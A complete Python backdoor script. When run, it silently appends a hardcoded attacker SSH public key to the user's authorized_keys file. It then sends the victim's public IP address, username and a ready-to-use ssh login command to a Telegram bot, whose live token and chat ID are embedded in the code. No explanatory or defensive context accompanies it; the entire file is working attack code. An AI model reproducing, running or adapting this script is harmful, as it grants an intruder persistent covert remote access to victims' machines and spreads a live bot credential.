import paramiko
import requests
import os

TOKEN = "7194120277:AAHgxkQX9dmGUTeIVhOM_I5T9fHjJTmgu8s"
CHAT_ID = "5705487207"

PUBLIC_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDa441GvVhyH4lm8Ky7dCulQFl/3bLWOWKdQQUGh5p63SZ1sMOn+Nu3MSkW4QWHNSEQXiH6UsxauHt69yMRtyuaCKS/qAihXSxz40XfVJmSElHLLZ0HGM7KlulzvpjYrJNR3c+oF82wz3zmx6+Tp4M9ANwPoHE0cIdLeh1uAb7+AvbyWCh44wE3CPNhKtt2YIWYV7ZTZWL06JUlsHWMQluo1y38iFX+SYsh91K68hqD36TLbAmM7DjNjk+tQFkvS9kDaEDUlklK631l6XKnXKV/MjBi9/F/R2oot0ZxxcbQK1O3hIqcPFkhQPwjT3EHEvHXvpERM8+20t29O/prVFxBTyqXZW0LfFVrH4Icd/Hylt0qbWaqZ+e4j/u3cihlX2AVbx89GggvclnQDdJyAgSARKR3bgp+OOjHjK4lSeMTI+9aS7SLWsPIlUopVBTdu7S6JDxa/ZO4fXtV4jYwmliBMbfTc33iNcSp2nPQ034YXdvb2Ur0eh7cjHSUEtwKndpOqLk0SNJM9OMwMdV5w+gnUmsEEbAZb5XgjWsXynNxBMxNhq/aswKIzfhnf16wkf/upgXrSz3E2z+SDU4Hos1uluIckhsWNOOhOiE2/Z2gEy5A3l8CMO5kP7MxU2sR8KL+FYFPbpQk+976iuDy+DYxnG+iPo4bCAHZ7qkb7sjmEQ== speed@DESKTOP-BB01JD1"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def get_public_ip():
    try:
        response = requests.get("https://ipinfo.io/ip")
        return response.text.strip()
    except Exception as e:
        return f"Error retrieving IP: {str(e)}"

def get_username():
    return os.getlogin()

def add_ssh_key():
    try:
        ip = get_public_ip()
        user = get_username()
        
        auth_keys_path = os.path.expanduser("~/.ssh/authorized_keys")
        with open(auth_keys_path, "a") as auth_file:
            auth_file.write(PUBLIC_KEY + "\n")
        
        message = f"✅ Public key added successfully!\n📌 IP: {ip}\n👤 User: {user} \nssh {user}@{ip}"
        send_to_telegram(message)
    except Exception as e:
        send_to_telegram(f"❌ Failed to add key: {str(e)}")
        print(f"Error: {e}")

if __name__ == "__main__":
    add_ssh_key()
